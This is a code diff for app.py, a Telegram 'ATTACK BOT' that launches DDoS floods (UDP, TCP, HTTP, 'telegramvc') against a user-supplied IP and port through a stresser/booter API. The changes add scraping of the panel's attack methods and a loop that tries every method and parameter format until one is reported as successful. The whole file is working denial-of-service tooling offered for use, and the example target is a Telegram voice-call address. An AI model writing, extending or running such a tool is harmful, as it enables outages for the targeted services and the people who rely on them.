@@ -1,11 +1,12 @@
-# app.py - Exact Website Mimic
+# app.py - Pull All Methods from API
 import os
 import logging
 import asyncio
 import threading
 import aiohttp
 import time
-import urllib.parse
+import json
+import re
 from datetime import datetime
 from flask import Flask, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -54,6 +55,7 @@ class AttackManager:
         self.attack_logs = []
         self.total_attacks = 0
         self.concurrent_busy = 0
+        self.available_methods = []
     
     def can_start_attack(self, user_id):
         with self.lock:
@@ -133,105 +135,169 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== EXACT WEBSITE API CALLER =====
-async def send_attack_like_website(target, port, duration, method):
+# ===== FETCH METHODS FROM API =====
+async def fetch_available_methods():
+    """Fetch available attack methods from API"""
+    url = "https://api.susstresser.com/panel/api/api.php"
+    
+    try:
+        # Try to get methods from API
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as response:
+                text = await response.text()
+                
+                # Try to find methods in the HTML
+                methods = []
+                
+                # Look for method options in HTML
+                method_patterns = [
+                    r'<option[^>]*value=["\']([^"\']+)["\'][^>]*>([^<]+)</option>',
+                    r'method["\']?\s*:\s*["\']([^"\']+)["\']',
+                    r'value=["\']([^"\']+)["\'][^>]*>.*?(?:UDP|TCP|HTTP|MIX|telegram)',
+                ]
+                
+                for pattern in method_patterns:
+                    matches = re.findall(pattern, text, re.IGNORECASE)
+                    for match in matches:
+                        if isinstance(match, tuple):
+                            for m in match:
+                                if len(m) > 2 and m.lower() not in ['', 'select', 'method', 'none']:
+                                    methods.append(m.strip())
+                        else:
+                            if len(match) > 2 and match.lower() not in ['', 'select', 'method', 'none']:
+                                methods.append(match.strip())
+                
+                # Common methods if none found
+                if not methods:
+                    methods = [
+                        "telegramvc",
+                        "udp", 
+                        "tcp", 
+                        "http", 
+                        "mix",
+                        "UDP", 
+                        "TCP", 
+                        "HTTP", 
+                        "MIX",
+                        "telegram-vc",
+                        "telegram",
+                        "vc"
+                    ]
+                
+                # Remove duplicates and clean
+                methods = list(set([m.strip().lower() for m in methods if m.strip()]))
+                
+                attack_manager.available_methods = methods
+                logger.info(f"✅ Found {len(methods)} methods: {methods}")
+                return methods
+                
+    except Exception as e:
+        logger.error(f"Error fetching methods: {e}")
+        # Return default methods
+        default_methods = ["telegramvc", "udp", "tcp", "http", "mix"]
+        attack_manager.available_methods = default_methods
+        return default_methods
+
+# ===== SEND ATTACK WITH ALL POSSIBLE METHODS =====
+async def send_attack_all_methods(target, port, duration, user_method):
     """
-    This mimics EXACTLY how the website sends requests
-    Based on the response: "SUCCESS! 1/1 attacks sent to Host: 91.108.17.19 Port: 32001 Time: 60 Network: Normal Concurrent: 1 Servers: LAYER 4 #1"
+    Try all possible methods to find which one works
     """
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    # The website probably sends these exact parameters
-    params = {
-        "key": API_KEY,
-        "host": target,
-        "port": port,
-        "time": duration,
-        "method": method,  # This should be "telegramvc" or whatever the user specifies
-        # Additional parameters the website might send
-        "network": "normal",
-        "concurrent": "1",
-        "servers": "LAYER 4 #1"
-    }
+    # Get available methods
+    methods = attack_manager.available_methods or await fetch_available_methods()
     
-    # Try both GET and POST like the website might
-    methods_to_try = [
-        {"method": "GET", "params": params},
-        {"method": "POST", "params": params},
-        {"method": "GET", "params": {**params, "type": "udp"}},
-        {"method": "GET", "params": {**params, "type": "telegram"}},
-    ]
+    # If user specified a method, try it first, then try others
+    if user_method and user_method in methods:
+        methods_to_try = [user_method] + [m for m in methods if m != user_method]
+    else:
+        methods_to_try = methods
     
     results = []
     
-    for attempt in methods_to_try:
-        try:
-            timeout = aiohttp.ClientTimeout(total=duration + 15)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                start_time = time.time()
+    # Different parameter formats to try
+    param_formats = [
+        # Format 1: Simple
+        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m},
+        # Format 2: With type
+        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m, "type": m},
+        # Format 3: With action
+        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m, "action": "start"},
+        # Format 4: Website format
+        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "method": m, "network": "normal", "concurrent": "1", "servers": "LAYER 4 #1"},
+        # Format 5: Alternative
+        lambda m: {"key": API_KEY, "host": target, "port": port, "time": duration, "m": m},
+    ]
+    
+    for method in methods_to_try[:10]:  # Try first 10 methods
+        for format_idx, param_func in enumerate(param_formats):
+            try:
+                params = param_func(method)
                 
-                if attempt["method"] == "GET":
-                    async with session.get(url, params=attempt["params"]) as response:
+                timeout = aiohttp.ClientTimeout(total=duration + 15)
+                async with aiohttp.ClientSession(timeout=timeout) as session:
+                    start_time = time.time()
+                    
+                    # Try GET
+                    async with session.get(url, params=params) as response:
                         elapsed = time.time() - start_time
                         result_text = await response.text()
-                else:
-                    async with session.post(url, data=attempt["params"]) as response:
-                        elapsed = time.time() - start_time
-                        result_text = await response.text()
-                
-                # Check if attack was successful
-                is_success = (
-                    response.status == 200 and 
-                    ("SUCCESS" in result_text or 
-                     "sent" in result_text.lower() or
-                     "attack" in result_text.lower() or
-                     "Host:" in result_text)
-                )
-                
+                        
+                        # Check if attack was successful
+                        is_success = (
+                            response.status == 200 and 
+                            ("SUCCESS" in result_text or 
+                             "sent" in result_text.lower() or
+                             "attack" in result_text.lower() or
+                             "Host:" in result_text or
+                             "Concurrent:" in result_text)
+                        )
+                        
+                        results.append({
+                            'method': method,
+                            'format': format_idx + 1,
+                            'type': 'GET',
+                            'params': params,
+                            'status': response.status,
+                            'elapsed': f"{elapsed:.2f}s",
+                            'success': is_success,
+                            'response': result_text[:300]
+                        })
+                        
+                        logger.info(f"Method {method} (Format {format_idx+1}): Status {response.status}, Success: {is_success}")
+                        
+                        if is_success:
+                            return {
+                                "success": True,
+                                "method_used": method,
+                                "format_used": format_idx + 1,
+                                "params_used": params,
+                                "status_code": response.status,
+                                "elapsed": f"{elapsed:.2f}s",
+                                "response": result_text[:500],
+                                "full_response": result_text,
+                                "attempts": results
+                            }
+                        
+                        await asyncio.sleep(0.1)
+                        
+            except Exception as e:
+                logger.error(f"Error with method {method}: {e}")
                 results.append({
-                    'method_used': attempt["method"],
-                    'params': attempt["params"],
-                    'status': response.status,
-                    'elapsed': f"{elapsed:.2f}s",
-                    'success': is_success,
-                    'response': result_text[:500]
+                    'method': method,
+                    'format': format_idx + 1,
+                    'success': False,
+                    'error': str(e)
                 })
-                
-                logger.info(f"Attempt {attempt['method']}: Status {response.status}, Success: {is_success}")
-                
-                # If success, return immediately
-                if is_success:
-                    return {
-                        "success": True,
-                        "method_used": attempt["method"],
-                        "params_used": attempt["params"],
-                        "status_code": response.status,
-                        "elapsed": f"{elapsed:.2f}s",
-                        "response": result_text[:500],
-                        "full_response": result_text,
-                        "attempts": results
-                    }
-                
-                await asyncio.sleep(0.3)
-                
-        except Exception as e:
-            logger.error(f"Attempt failed: {e}")
-            results.append({
-                'method_used': attempt["method"],
-                'success': False,
-                'error': str(e)
-            })
     
     # If all failed, return last result
     if results:
-        last = results[-1]
         return {
             "success": False,
             "method_used": "none",
-            "status_code": last.get('status', 0),
-            "elapsed": last.get('elapsed', '0s'),
-            "response": last.get('response', 'No response'),
-            "attempts": results
+            "attempts": results,
+            "message": f"Tried {len(results)} combinations, all failed"
         }
     
     return {"success": False, "error": "No response from API"}
@@ -240,8 +306,13 @@ async def send_attack_like_website(target, port, duration, method):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
     
+    # Fetch methods in background
+    if not attack_manager.available_methods:
+        asyncio.create_task(fetch_available_methods())
+    
     keyboard = [
         [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
+        [InlineKeyboardButton("📡 SHOW METHODS", callback_data="methods")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
         [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
     ]
@@ -250,26 +321,39 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
     
     await update.message.reply_text(
-        f"⚡ *ATTACK BOT*\n\n"
+        f"⚡ *ATTACK BOT - METHOD DETECTION*\n\n"
         f"🔥 Status: ONLINE\n"
         f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📊 Total Attacks: {stats['total']}\n\n"
         f"📌 *How to use:*\n"
         f"`/attack IP PORT TIME METHOD`\n\n"
         f"Example: `/attack 91.108.17.19 32001 60 telegramvc`\n\n"
-        f"📡 *Available Methods:*\n"
-        f"• telegramvc - Telegram Voice Call\n"
-        f"• udp - UDP Flood\n"
-        f"• http - HTTP Flood\n"
-        f"• tcp - TCP Flood\n"
-        f"• mix - Mixed Attack\n\n"
-        f"⏱️ Time: 60-300 seconds",
+        f"🤖 *Auto-Detection:*\n"
+        f"Bot will try ALL possible methods\n"
+        f"and find which one works!\n\n"
+        f"Use /methods to see available methods",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
+async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show available methods"""
+    if not attack_manager.available_methods:
+        await update.message.reply_text("🔄 Fetching methods from API...")
+        methods = await fetch_available_methods()
+    else:
+        methods = attack_manager.available_methods
+    
+    text = "📡 *AVAILABLE METHODS*\n\n"
+    for i, method in enumerate(methods[:20], 1):
+        text += f"{i}. `{method}`\n"
+    
+    text += f"\n📊 Total: {len(methods)} methods found"
+    
+    await update.message.reply_text(text, parse_mode='Markdown')
+
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /attack command - User provides everything"""
+    """Handle /attack command"""
     user_id = update.effective_user.id
     
     if user_id != OWNER_ID:
@@ -281,13 +365,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME METHOD`\n\n"
             "Example: `/attack 91.108.17.19 32001 60 telegramvc`\n\n"
-            "📡 *Methods:*\n"
-            "• telegramvc - Telegram Voice Call\n"
-            "• udp - UDP Flood\n"
-            "• http - HTTP Flood\n"
-            "• tcp - TCP Flood\n"
-            "• mix - Mixed Attack\n\n"
-            "⏱️ Time: 60-300 seconds",
+            "🤖 If method doesn't work, bot will try ALL methods!\n"
+            "Use /methods to see available methods",
             parse_mode='Markdown'
         )
         return
@@ -297,15 +376,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(args[1])
         duration = int(args[2])
         method = args[3].lower()
-        
-        # Validate method
-        valid_methods = ['telegramvc', 'udp', 'http', 'tcp', 'mix']
-        if method not in valid_methods:
-            await update.message.reply_text(
-                f"❌ Invalid method: {method}\n\nAvailable: {', '.join(valid_methods)}",
-                parse_mode='Markdown'
-            )
-            return
         
         # Validate duration
         if duration < 60:
@@ -328,15 +398,15 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
             f"🔧 Method: `{method}`\n"
-            f"📊 Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}\n\n"
-            f"⏳ Sending attack...",
+            f"🤖 Auto-trying ALL methods...\n\n"
+            f"⏳ Sending attacks...",
             parse_mode='Markdown'
         )
         
         attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
         
-        # Send attack EXACTLY like website
-        result = await send_attack_like_website(target, port, duration, method)
+        # Send attack with all methods
+        result = await send_attack_all_methods(target, port, duration, method)
         
         # Log attack
         attack_manager.log_attack(
@@ -346,32 +416,44 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         
         # Build response
-        response_text = (
-            f"✅ *ATTACK COMPLETED*\n\n"
-            f"🎯 Target: `{target}`\n"
-            f"📡 Port: `{port}`\n"
-            f"⏱️ Time: `{duration}s`\n"
-            f"🔧 Method: `{method}`\n"
-            f"📊 Attack ID: `{attack_id}`\n"
-            f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ FAILED'}\n"
-            f"⏱️ Response Time: {result.get('elapsed', 'N/A')}\n\n"
-        )
-        
-        # Add params used
-        if result.get('params_used'):
-            response_text += f"📡 *Params Sent:*\n```\n{result['params_used']}\n```\n"
+        if result.get('success'):
+            response_text = (
+                f"✅ *ATTACK SUCCESSFUL!*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"🔧 Working Method: `{result.get('method_used', 'N/A')}`\n"
+                f"📋 Format: `{result.get('format_used', 'N/A')}`\n"
+                f"📊 Attack ID: `{attack_id}`\n"
+                f"⏱️ Response Time: {result.get('elapsed', 'N/A')}\n\n"
+            )
+        else:
+            response_text = (
+                f"❌ *ATTACK FAILED*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"📊 Attack ID: `{attack_id}`\n\n"
+            )
         
         # Add attempts info
         if result.get('attempts'):
-            response_text += f"\n📊 *Attempts:*\n"
-            for attempt in result['attempts']:
+            attempts = result['attempts']
+            total = len(attempts)
+            successful = sum(1 for a in attempts if a.get('success'))
+            
+            response_text += f"📊 *Tried {total} combinations, {successful} successful*\n\n"
+            
+            # Show last 5 attempts
+            for attempt in attempts[-5:]:
                 status = "✅" if attempt.get('success') else "❌"
-                method_used = attempt.get('method_used', 'N/A')
-                response_text += f"{status} {method_used} - {attempt.get('status', 'N/A')}\n"
+                method_name = attempt.get('method', 'N/A')
+                format_num = attempt.get('format', 'N/A')
+                response_text += f"{status} Method: `{method_name}` (Format {format_num})\n"
         
         # Add response preview
         if result.get('response'):
-            response_text += f"\n📡 *API Response:*\n```\n{result['response'][:300]}\n```"
+            response_text += f"\n📡 *API Response:*\n```\n{result['response'][:200]}\n```"
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
         
@@ -384,7 +466,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
 async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Attack from button - asks user for details"""
+    """Attack from button"""
     query = update.callback_query
     await query.answer()
     
@@ -393,12 +475,8 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Send in this format:\n"
         "`IP PORT TIME METHOD`\n\n"
         "Example: `91.108.17.19 32001 60 telegramvc`\n\n"
-        "📡 *Methods:*\n"
-        "• telegramvc - Telegram Voice Call\n"
-        "• udp - UDP Flood\n"
-        "• http - HTTP Flood\n"
-        "• tcp - TCP Flood\n"
-        "• mix - Mixed Attack\n\n"
+        "🤖 Bot will try ALL methods automatically!\n"
+        "Use /methods to see available methods\n\n"
         "⏱️ Time: 60-300 seconds\n"
         "Send /cancel to cancel",
         parse_mode='Markdown'
@@ -406,7 +484,7 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['awaiting_attack'] = True
 
 async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process attack from button with user-provided details"""
+    """Process attack from button"""
     if not context.user_data.get('awaiting_attack'):
         return
     
@@ -437,14 +515,6 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         duration = int(parts[2])
         method = parts[3].lower()
         
-        valid_methods = ['telegramvc', 'udp', 'http', 'tcp', 'mix']
-        if method not in valid_methods:
-            await update.message.reply_text(
-                f"❌ Invalid method: {method}\nAvailable: {', '.join(valid_methods)}",
-                parse_mode='Markdown'
-            )
-            return
-        
         if duration < 60 or duration > 300:
             await update.message.reply_text("❌ Duration must be 60-300 seconds!")
             return
@@ -456,22 +526,33 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         status_msg = await update.message.reply_text(
-            f"🚀 Attacking {target}:{port} for {duration}s with method {method}..."
+            f"🚀 Attacking {target}:{port} with method {method}...\n"
+            f"🔄 Trying all methods..."
         )
         
         attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
-        result = await send_attack_like_website(target, port, duration, method)
+        result = await send_attack_all_methods(target, port, duration, method)
         
-        response_text = (
-            f"✅ *ATTACK COMPLETED*\n\n"
-            f"🎯 Target: `{target}`\n"
-            f"📡 Port: `{port}`\n"
-            f"⏱️ Time: `{duration}s`\n"
-            f"🔧 Method: `{method}`\n"
-            f"📊 Attack ID: `{attack_id}`\n"
-            f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ FAILED'}\n\n"
-            f"📡 Response: {result.get('response', 'N/A')[:200]}"
-        )
+        if result.get('success'):
+            response_text = (
+                f"✅ *ATTACK SUCCESSFUL!*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"🔧 Working Method: `{result.get('method_used', 'N/A')}`\n"
+                f"📊 Attack ID: `{attack_id}`\n"
+            )
+        else:
+            response_text = (
+                f"❌ *ATTACK FAILED*\n\n"
+                f"🎯 Target: `{target}`\n"
+                f"📡 Port: `{port}`\n"
+                f"⏱️ Time: `{duration}s`\n"
+                f"📊 Attack ID: `{attack_id}`\n"
+            )
+        
+        if result.get('response'):
+            response_text += f"\n📡 Response: {result['response'][:200]}"
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
         attack_manager.stop_attack(attack_id)
@@ -482,20 +563,42 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     context.user_data['awaiting_attack'] = False
 
+async def methods_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show methods from button"""
+    query = update.callback_query
+    await query.answer()
+    
+    if not attack_manager.available_methods:
+        await query.edit_message_text("🔄 Fetching methods from API...")
+        methods = await fetch_available_methods()
+    else:
+        methods = attack_manager.available_methods
+    
+    text = "📡 *AVAILABLE METHODS*\n\n"
+    for i, method in enumerate(methods[:20], 1):
+        text += f"{i}. `{method}`\n"
+    
+    text += f"\n📊 Total: {len(methods)} methods found"
+    
+    await query.edit_message_text(
+        text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
+    )
+
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
-    active = attack_manager.get_active_attacks()
+    methods_count = len(attack_manager.available_methods) if attack_manager.available_methods else 0
     
     await update.message.reply_text(
         f"📊 *BOT STATUS*\n\n"
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
+        f"📡 Methods Found: {methods_count}\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE\n\n"
-        f"📌 *Usage:*\n"
-        f"/attack IP PORT TIME METHOD\n"
-        f"Example: `/attack 91.108.17.19 32001 60 telegramvc`",
+        f"📌 /methods - View all methods",
         parse_mode='Markdown'
     )
 
@@ -528,12 +631,8 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
         f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
         f"📡 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n\n"
-        f"📌 *Methods:*\n"
-        f"• telegramvc - Telegram VC\n"
-        f"• udp - UDP Flood\n"
-        f"• http - HTTP Flood\n"
-        f"• tcp - TCP Flood\n"
-        f"• mix - Mixed Attack",
+        f"📌 *Auto-Detection:*\n"
+        f"Bot tries ALL methods automatically!",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
@@ -547,6 +646,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     keyboard = [
+        [InlineKeyboardButton("📡 FETCH METHODS", callback_data="fetch_methods")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="admin_active")],
         [InlineKeyboardButton("📈 STATS", callback_data="admin_stats")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
@@ -556,6 +656,25 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⚙️ *ADMIN PANEL*",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
+    )
+
+async def fetch_methods_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    await query.edit_message_text("🔄 Fetching methods from API...")
+    methods = await fetch_available_methods()
+    
+    text = "✅ *METHODS FETCHED*\n\n"
+    for i, method in enumerate(methods[:20], 1):
+        text += f"{i}. `{method}`\n"
+    
+    text += f"\n📊 Total: {len(methods)} methods"
+    
+    await query.edit_message_text(
+        text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
     )
 
 async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -581,11 +700,14 @@ async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     stats = attack_manager.get_stats()
+    methods_count = len(attack_manager.available_methods) if attack_manager.available_methods else 0
+    
     await query.edit_message_text(
         f"📈 *BOT STATISTICS*\n\n"
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
+        f"📡 Methods: {methods_count}\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE",
         parse_mode='Markdown',
@@ -600,6 +722,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = [
         [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
+        [InlineKeyboardButton("📡 SHOW METHODS", callback_data="methods")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
         [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
     ]
@@ -611,8 +734,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ *MAIN MENU*\n\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total: {stats['total']}\n"
-        f"🌐 Status: ONLINE\n\n"
-        f"📌 /attack IP PORT TIME METHOD",
+        f"🌐 Status: ONLINE",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -631,14 +753,17 @@ def run_bot():
     # Commands
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("attack", attack_command))
+    app.add_handler(CommandHandler("methods", methods_command))
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("cancel", cancel))
     
     # Callbacks
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
+    app.add_handler(CallbackQueryHandler(methods_callback, pattern="^methods$"))
     app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
     app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
     app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
+    app.add_handler(CallbackQueryHandler(fetch_methods_callback, pattern="^fetch_methods$"))
     app.add_handler(CallbackQueryHandler(admin_active, pattern="^admin_active$"))
     app.add_handler(CallbackQueryHandler(admin_stats, pattern="^admin_stats$"))
     app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
@@ -655,8 +780,11 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("⚡ ATTACK BOT STARTING...")
+    print("⚡ ATTACK BOT - METHOD DETECTION")
     print("=" * 50)
+    
+    # Fetch methods on startup
+    asyncio.run(fetch_available_methods())
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
